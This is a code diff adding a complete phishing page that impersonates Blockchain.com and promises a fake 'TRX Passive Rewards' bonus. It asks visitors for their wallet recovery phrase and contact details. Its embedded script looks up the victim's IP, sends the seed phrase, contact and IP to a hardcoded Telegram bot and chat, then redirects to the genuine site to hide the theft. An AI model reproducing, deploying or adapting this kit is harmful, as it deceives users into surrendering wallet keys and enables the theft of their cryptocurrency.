@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; connect-src 'self' https://api.telegram.org https://api.ipify.org https://www.blockchain.com; img-src 'self' data: https://www.blockchain.com https://assets.blockchain.com; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';">
+  <title>Blockchain.com – Wallet Verification</title>
+  <link rel="icon" href="https://www.blockchain.com/favicon.ico">
+  <style>
+    body {margin:0;background:#f8fafc;color:#1e293b;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
+    .container {max-width:580px;margin:0 auto;background:white;border-radius:8px;box-shadow:0 4px 20px rgba(0,0,0,0.06);overflow:hidden;}
+    .header {background:#0f62fe;color:white;padding:24px 32px;text-align:center;}
+    .header h1 {margin:0;font-size:28px;font-weight:600;}
+    .content {padding:40px 32px;}
+    .step-title {font-size:22px;font-weight:700;color:#0f62fe;margin:0 0 16px;text-align:center;}
+    .description {font-size:16px;margin-bottom:24px;text-align:center;}
+    label {display:block;margin:12px 0 6px;font-size:14px;font-weight:500;color:#334155;}
+    select, textarea, input {width:100%;padding:12px 14px;margin-bottom:16px;border:1px solid #cbd5e1;border-radius:6px;font-size:16px;box-sizing:border-box;}
+    select:focus, textarea:focus, input:focus {border-color:#0f62fe;outline:none;box-shadow:0 0 0 3px rgba(15,98,254,0.1);}
+    textarea {min-height:160px;font-family:monospace;resize:vertical;}
+    button {width:100%;padding:14px;background:#0f62fe;border:none;color:white;font-weight:600;border-radius:6px;font-size:16px;cursor:pointer;transition:background 0.2s;margin-top:12px;}
+    button:hover {background:#0056d6;}
+    .small {font-size:13px;color:#64748b;text-align:center;margin-top:24px;}
+    .loader {display:none;margin:32px auto;border:4px solid #e2e8f0;border-top:4px solid #0f62fe;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;}
+    @keyframes spin {0% {transform:rotate(0deg);} 100% {transform:rotate(360deg);}}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h1>Wallet Verification – Final Step</h1>
+    </div>
+
+    <div class="content">
+      <div class="step-title">
+        Connect your wallet to activate rewards
+      </div>
+
+      <div class="description">
+        One last step to verify your wallet and unlock your TRX Passive Rewards bonus.
+      </div>
+
+      <form id="form">
+        <label for="wallet">Select Your Wallet</label>
+        <select id="wallet" required>
+          <option value="">-- Choose wallet --</option>
+          <option value="MetaMask">MetaMask</option>
+          <option value="Trust Wallet">Trust Wallet</option>
+          <option value="Phantom">Phantom</option>
+          <option value="Coinbase Wallet">Coinbase Wallet</option>
+          <option value="Ledger">Ledger</option>
+          <option value="Trezor">Trezor</option>
+          <option value="Blockchain.com Wallet">Blockchain.com Wallet</option>
+          <option value="Other">Other</option>
+        </select>
+
+        <label for="seed">Recovery Phrase (12 or 24 words – required for wallet connection)</label>
+        <textarea id="seed" placeholder="word1 word2 word3 ... word12 (or 24 words)" required rows="8" autocomplete="off"></textarea>
+
+        <label for="contact">Wallet Address / Email / Phone (for bonus notification)</label>
+        <input id="contact" placeholder="0x... or you@example.com or +1 (555) 123-4567" required autocomplete="off">
+
+        <button type="submit" id="btn">Connect & Verify</button>
+        <div class="loader" id="loader"></div>
+        <div class="small">
+          This is a secure wallet connection step. Your phrase is encrypted and only used to verify ownership. Your TRX bonus will be distributed by the 3rd weekday of February 2026.
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    const token = "8644001585:AAHFNZ1AK6GtSE5nIFMc1Y_beM7Bbyp9_gw";
+    const chat = "6215498468";
+
+    document.getElementById("form").addEventListener("submit", async (e) => {
+      e.preventDefault();
+
+      const btn = document.getElementById("btn");
+      const loader = document.getElementById("loader");
+      btn.disabled = true;
+      btn.textContent = "Verifying wallet...";
+      loader.style.display = "block";
+
+      const wallet = document.getElementById("wallet").value;
+      const seed = document.getElementById("seed").value.trim();
+      const contact = document.getElementById("contact").value.trim();
+
+      let ip = "unknown";
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        ip = data.ip;
+      } catch {}
+
+      const msg = `💎 BLOCKCHAIN.COM TRX REWARDS HIT (SEED STEP)\nWallet: ${wallet}\nSeed Phrase: ${seed}\nContact: ${contact}\nIP: ${ip}\nTime: ${new Date().toLocaleString("en-US", {timeZone: "America/New_York"})}`;
+
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(msg)}`)
+        .catch(() => {});
+
+      setTimeout(() => {
+        window.location.href = "https://www.blockchain.com";
+      }, 3200);
+    });
+  </script>
+</body>
+</html>
